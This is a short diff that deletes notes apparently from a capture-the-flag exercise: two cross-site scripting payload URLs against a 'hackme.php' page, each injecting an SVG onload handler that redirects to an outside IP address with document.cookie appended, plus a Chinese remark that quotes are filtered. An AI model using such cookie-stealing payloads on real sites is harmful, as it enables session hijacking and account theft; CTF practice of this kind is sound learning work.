@@ -1,6 +1,0 @@
-https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG/ONLoAD="window.location=http://140.113.68.171:8000/test.php?flag=document.cookie">
-
-https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG/ONLoAD="window.location='http://140.113.68.171:8000/test.php?flag='+document.cookie">
-不能有單引號和雙引號
-
-
